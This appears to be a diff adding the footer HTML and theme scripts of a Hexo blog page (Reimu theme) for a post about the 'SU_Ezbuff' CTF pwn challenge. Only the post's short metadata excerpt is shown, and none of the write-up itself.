+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "Ezbuff",
+          url: "https://khighl.github.io.git/2026/03/25/SU_Ezbuff/",
+          excerpt: "",
+          description: "",
+          stripContent: "SU_Ezbuff题目分析本题的附件包含pwn,libc.so.6和libevent-2.1.so.7.0.1 其中libevent-2.1.so.7.0.1包含了bufferevent相关的库函数 从pwn中可以看到main函数就是个请求分配器, 且开启了沙箱禁止命令执行 12345678910111213141516171819202122232425262728__int64 __fastcall main(__int64 a1, char **a2, char **a3)&amp;#123;  ",
+          date: "Wed Mar 25 2026 00:00:00 GMT+0800",
+          updated: "Wed Mar 25 2026 21:01:51 GMT+0800",
+          cover: "/images/lm.jpg",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
